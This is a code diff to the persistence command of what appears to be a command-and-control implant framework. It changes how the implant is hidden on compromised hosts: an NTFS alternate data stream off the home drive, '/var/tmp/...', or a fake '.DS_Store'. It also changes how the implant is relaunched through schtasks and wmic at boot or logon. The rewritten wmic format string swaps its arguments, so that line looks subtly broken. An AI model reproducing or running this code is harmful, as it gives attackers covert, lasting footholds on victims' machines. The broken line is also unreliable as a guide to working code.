@@ -33,71 +33,117 @@ import (
 )
 
 func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
-	session := ActiveSession.GetInteractive()
+	session := ActiveSession.Get()
 	if session == nil {
 		return
 	}
 
-	path := ""
+	path := ctx.Flags.String("path")
 	sliver := ctx.Flags.String("sliver")
 	if sliver == "" {
 		sliver = session.Name
 		fmt.Printf(Info+"Sliver not specified. Defaulting to %s\n", sliver)
 	}
 	stageOS := session.OS
+	homedrive := ""
+
+	// Fixup path
+	if path == "" {
+		resp, err := rpc.DbGet(context.Background(), &sliverpb.DbGetReq{
+			Bucket: "persist",
+			Key:    sliver,
+		})
+		if err != nil {
+			// Key Not Found
+			switch stageOS {
+			case "windows":
+				// %HOMEDRIVE% Variable expansion
+				resp, err := rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+					Name:    "HOMEDRIVE",
+					Request: ActiveSession.Request(ctx),
+				})
+				if err != nil {
+					fmt.Printf(Warn+"Error: %v\n", err)
+					return
+				}
+				if len(resp.Variables) == 1 {
+					homedrive = resp.Variables[0].Value
+				} else {
+					homedrive = "C:"
+				}
+				if session.Username == "NT AUTHORITY\\SYSTEM" {
+					path = homedrive + "\\:" + sliver + ".exe"
+				} else {
+					// %HOMEPATH% Variable expansion
+					resp, err = rpc.GetEnv(context.Background(), &sliverpb.EnvReq{
+						Name:    "HOMEPATH",
+						Request: ActiveSession.Request(ctx),
+					})
+					if err != nil {
+						fmt.Printf(Warn+"Error: %v\n", err)
+						return
+					}
+					if len(resp.Variables) == 1 {
+						path = resp.Variables[0].Value
+					}
+					if path == "" {
+						user := strings.Split(session.Username, "\\")
+						path = "\\Users\\" + user[len(user)-1]
+					}
+					path = homedrive + path + ":" + sliver + ".exe"
+				}
+			case "linux":
+				path = "/var/tmp/..."
+			case "darwin":
+				path = "/var/tmp/.DS_Store"
+			}
+		} else {
+			path = string(resp.Value)
+		}
+		fmt.Printf(Info+"Path: %s\n", path)
+	}
+
+	if !isUserAnAdult() {
+		return
+	}
+
+	_, err := rpc.DbSet(context.Background(), &sliverpb.DbSetReq{
+		Bucket: "persist",
+		Key:    sliver,
+		Value:  []byte(path),
+	})
+	if err != nil {
+		fmt.Printf(Warn+"Error: %v\n", err)
+		return
+	}
 
 	if ctx.Flags.Bool("unload") {
 		switch stageOS {
 		case "windows":
-			if session.Username == "NT AUTHORITY\\SYSTEM" {
-				_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
-					Path:      "C:\\:" + sliver + ".exe",
-					Recursive: false,
-					Force:     true,
-					Request:   ActiveSession.Request(ctx),
-				})
-				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
-					return
-				}
+			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
+				Path:      path,
+				Recursive: false,
+				Force:     true,
+				Request:   ActiveSession.Request(ctx),
+			})
+			if err != nil {
+				fmt.Printf(Warn+"Error: %v\n", err)
+				return
+			}
 
-				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-					Path:    "C:\\Windows\\System32\\schtasks.exe",
-					Args:    []string{"/delete", "/tn", sliver, "/f"},
-					Output:  false,
-					Request: ActiveSession.Request(ctx),
-				})
-				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
-					return
-				}
-			} else {
-				user := strings.Split(session.Username, "\\")
-				_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
-					Path:      "C:\\Users\\" + user[len(user)-1] + ":" + sliver + ".exe",
-					Recursive: false,
-					Force:     true,
-					Request:   ActiveSession.Request(ctx),
-				})
-				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
-					return
-				}
-
-				_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-					Path:    "C:\\Windows\\System32\\schtasks.exe",
-					Args:    []string{"/delete", "/tn", sliver, "/f"},
-					Output:  false,
-					Request: ActiveSession.Request(ctx),
-				})
-				if err != nil {
-					fmt.Printf(Warn+"Error: %v\n", err)
-					return
-				}
+			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
+				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
+				Args:    []string{"/delete", "/tn", sliver, "/f"},
+				Output:  false,
+				Request: ActiveSession.Request(ctx),
+			})
+			if err != nil {
+				fmt.Printf(Warn+"Error: %v\n", err)
+				return
 			}
 		case "linux":
 			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
-				Path:      "/var/tmp/...",
+				Path:      path,
 				Recursive: false,
 				Force:     true,
 				Request:   ActiveSession.Request(ctx),
@@ -146,7 +192,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			}
 		case "darwin":
 			_, err := rpc.Rm(context.Background(), &sliverpb.RmReq{
-				Path:      "/var/tmp/.DS_Store",
+				Path:      path,
 				Recursive: false,
 				Force:     true,
 				Request:   ActiveSession.Request(ctx),
@@ -199,10 +245,6 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		return
 	}
 
-	if !isUserAnAdult() {
-		return
-	}
-
 	ctrl := make(chan bool)
 	go spin.Until("Regenerating sliver, please wait ...", ctrl)
 	stageFile, err := rpc.Regenerate(context.Background(), &clientpb.RegenerateReq{
@@ -220,20 +262,6 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 	exe := string(stageFile.GetFile().GetData())
 
 	// Upload file
-	switch stageOS {
-	case "windows":
-		// %HOMEPATH% Variable expansion would make this more reliable
-		if session.Username == "NT AUTHORITY\\SYSTEM" {
-			path = "C:\\:" + sliver + ".exe"
-		} else {
-			user := strings.Split(session.Username, "\\")
-			path = "C:\\Users\\" + user[len(user)-1] + ":" + sliver + ".exe"
-		}
-	case "linux":
-		path = "/var/tmp/..."
-	case "darwin":
-		path = "/var/tmp/.DS_Store"
-	}
 	gzip := new(encoders.Gzip)
 	ctrl = make(chan bool)
 	go spin.Until("Uploading the sliver, please wait...", ctrl)
@@ -254,12 +282,11 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 
 	switch stageOS {
 	case "windows":
-		path = fmt.Sprintf("C:\\Windows\\System32\\Wbem\\wmic.exe process call create \"%s\"", path)
-		fmt.Println(Info + path)
+		path = fmt.Sprintf("%s\\Windows\\System32\\Wbem\\wmic.exe process call create \"%s\"", path, homedrive)
 		if session.Username == "NT AUTHORITY\\SYSTEM" {
 			// Root persistence (schtasks)
 			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-				Path:    "C:\\Windows\\System32\\schtasks.exe",
+				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
 				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onstart", "/ru", "System", "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
@@ -271,7 +298,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 		} else {
 			// User persistence (schtasks)
 			_, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
-				Path:    "C:\\Windows\\System32\\schtasks.exe",
+				Path:    homedrive + "\\Windows\\System32\\schtasks.exe",
 				Args:    []string{"/create", "/tn", sliver, "/tr", path, "/sc", "onlogon", "/f"},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
